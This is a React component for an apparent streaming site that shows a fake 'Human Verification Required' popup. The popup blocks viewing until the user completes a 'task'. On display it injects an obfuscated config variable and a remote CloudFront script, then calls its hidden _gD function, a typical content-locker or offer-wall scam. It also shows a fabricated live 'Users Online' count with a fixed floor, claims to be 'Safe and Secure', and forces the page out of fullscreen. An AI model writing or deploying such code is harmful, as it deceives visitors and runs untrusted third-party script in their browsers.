import { useState, useEffect, useRef } from 'react';
import './VerifyPopup.css';

// Popup timing rules
const SHOW_TIME_MS = 6 * 60 * 1000;        // 6 minutes
const FIRST_DELAY_MS = 150 * 1000;         // 2.5 minutes 150 * 1000;, now 1 day 24 * 60 * 60 * 1000;
const WEEKLY_INTERVAL_MS = 7 * 24 * 60 * 60 * 1000; // 7 days

const VerifyPopup = () => {
  const [isVisible, setIsVisible] = useState(false);
  const [onlineUsers, setOnlineUsers] = useState(5993);
  const instructionsContainerRef = useRef(null);
  const scriptsLoadedRef = useRef(false);
  const scriptElementsRef = useRef([]);
  const verifyWindowTimerRef = useRef(null);
  const initialDelayTimerRef = useRef(null);
  
  // Function to handle showing instructions
  const expandInstructions = () => {
    if (instructionsContainerRef.current) {
      instructionsContainerRef.current.style.display = 
        instructionsContainerRef.current.style.display === 'block' ? 'none' : 'block';
    }
  };

  // Function to simulate online counter updates
  useEffect(() => {
    const updateOnlineCounter = () => {
      // Random change between -5 and +5
      const change = Math.floor(Math.random() * 11) - 5;
      setOnlineUsers(prevCount => {
        const newCount = prevCount + change;
        // Prevent the count from dropping below a realistic minimum
        return newCount < 5993 ? 5993 : newCount;
      });
    };

    const counterInterval = setInterval(updateOnlineCounter, 5000);
    return () => clearInterval(counterInterval);
  }, []);

  // Function to exit fullscreen mode when popup appears
  useEffect(() => {
    const exitFullscreen = () => {
      if (document.fullscreenElement) {
        document.exitFullscreen()
          .then(() => console.log("Exited fullscreen mode"))
          .catch((err) => console.error("Error exiting fullscreen:", err));
      }
    };

    const resetOrientation = () => {
      if (window.screen.orientation && window.screen.orientation.type.startsWith("landscape")) {
        window.screen.orientation.lock("portrait")
          .then(() => console.log("Orientation reset to portrait"))
          .catch((err) => console.error("Error resetting orientation:", err));
      }
    };

    if (isVisible) {
      exitFullscreen();
      resetOrientation();
    }
  }, [isVisible]);

  // Script loading effect - runs when popup becomes visible
  useEffect(() => {
    // Only load scripts if the popup is visible and scripts haven't been loaded yet
    if (isVisible && !scriptsLoadedRef.current) {
      const loadScripts = () => {
        // Create and append inline configuration script
        const configScript = document.createElement('script');
        configScript.type = 'text/javascript';
        configScript.text = 'var TLbWG_MpT_iELhZc = { "it": 4430040, "key": "a9946" };';
        document.body.appendChild(configScript);
        
        // Create and append external CloudFront script
        const externalScript = document.createElement('script');
        externalScript.src = 'https://dlk457skl57zp.cloudfront.net/23a8659.js';
        externalScript.async = true;
        
        // Handle loading errors
        externalScript.onerror = () => {
          console.error('Failed to load verification script');
        };
        
        document.body.appendChild(externalScript);
        
        // Save references to the script elements for cleanup
        scriptElementsRef.current = [configScript, externalScript];
        scriptsLoadedRef.current = true;
      };
      
      loadScripts();
    }
    
    // Cleanup function - remove scripts when popup closes or component unmounts
    return () => {
      if (!isVisible && scriptsLoadedRef.current) {
        // Remove script elements if they exist
        scriptElementsRef.current.forEach(scriptElement => {
          if (scriptElement && scriptElement.parentNode) {
            scriptElement.parentNode.removeChild(scriptElement);
          }
        });
        
        // Reset the refs
        scriptElementsRef.current = [];
        scriptsLoadedRef.current = false;
      }
    };
  }, [isVisible]);

  // Main popup timing logic
  useEffect(() => {
    const now = Date.now();
    const lastPopupTime = localStorage.getItem("lastPopupTime");
    const verifyWindowStartTime = localStorage.getItem("verifyWindowStartTime");

    // Helper: check if 7 days have passed since lastPopupTime
    const isWeeklyIntervalPassed = !lastPopupTime || now - parseInt(lastPopupTime, 10) >= WEEKLY_INTERVAL_MS;
    // Helper: check if we are in the 6-minute verification window
    const isInVerifyWindow = verifyWindowStartTime && now - parseInt(verifyWindowStartTime, 10) < SHOW_TIME_MS;

    // If in verification window, always show popup
    if (isInVerifyWindow) {
      setIsVisible(true);
      // Set a timer to close popup after the window ends
      if (verifyWindowTimerRef.current) clearTimeout(verifyWindowTimerRef.current);
      verifyWindowTimerRef.current = setTimeout(() => {
        setIsVisible(false);
        localStorage.setItem("lastPopupTime", Date.now());
        localStorage.removeItem("verifyWindowStartTime");
      }, SHOW_TIME_MS - (now - parseInt(verifyWindowStartTime, 10)));
      return () => clearTimeout(verifyWindowTimerRef.current);
    }

    // If 7 days have passed since last verification, start new cycle
    if (isWeeklyIntervalPassed) {
      // Wait 150s before showing popup
      if (initialDelayTimerRef.current) clearTimeout(initialDelayTimerRef.current);
      initialDelayTimerRef.current = setTimeout(() => {
        setIsVisible(true);
      }, FIRST_DELAY_MS);
      return () => clearTimeout(initialDelayTimerRef.current);
    }

    // Otherwise, hide popup
    setIsVisible(false);
  }, []); // Only run on mount

  // When popup closes (after 6 min), cleanup timers
  useEffect(() => {
    return () => {
      if (verifyWindowTimerRef.current) clearTimeout(verifyWindowTimerRef.current);
      if (initialDelayTimerRef.current) clearTimeout(initialDelayTimerRef.current);
    };
  }, []);

  // Close popup handler (when user clicks Verify Now)
  const handleVerify = () => {
    // Start the 6-minute verification window
    localStorage.setItem("verifyWindowStartTime", Date.now());
    setIsVisible(true); // Always show during this window
    // Optionally, call your verification function
    if (window._gD && typeof window._gD === 'function') {
      window._gD();
    } else {
      console.warn('Verification function not available yet');
    }
  };

  if (!isVisible) return null;

  return (
    <div className="popup-overlay" style={{ display: isVisible ? 'block' : 'none' }}>
      <div className="popup-content">
        <img src="https://animesobt.great-site.net/logo.png" alt="Logo" className="popup-logo" />
        <h2>Human Verification Required</h2>
        <p>Honored user, kindly complete a quick verification to start streaming.</p>
        <button className="verify-btn" onClick={handleVerify}>Verify Now</button>
        <p className="instructions">
          Simply click <strong>"Verify Now"</strong>, to view available task. Please, Complete one task and your access will be unlocked instantly!!
        </p>
        <a className="how-to-btn" href="#" onClick={(e) => {e.preventDefault(); expandInstructions();}}>.</a>
        <p>Safe and Secure:</p>
        
        {/* Instructions Container */}
        <div id="instructions-container" ref={instructionsContainerRef} style={{ display: 'none' }}>
          {/* Country-specific instructions will be empty for now */}
        </div>
        
        {/* Online User Counter */}
        <div className="live-counter-container">
          <div className="counter-icon">
            {/* User SVG Icon */}
            <svg width="20" height="20" fill="#fff" viewBox="0 0 24 24">
              <path d="M12 12c2.209 0 4-1.791 4-4s-1.791-4-4-4-4 1.791-4 4 1.791 4 4 4zm0 2c-2.67 0-8 1.337-8 4v2h16v-2c0-2.663-5.33-4-8-4z"/>
            </svg>
          </div>
          <div className="counter-details">
            <div className="counter-text">
              <span className="counter-number">{onlineUsers}</span>
              <span className="counter-label">Users Online</span>
            </div>
            <div className="live-indicator"></div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default VerifyPopup; 
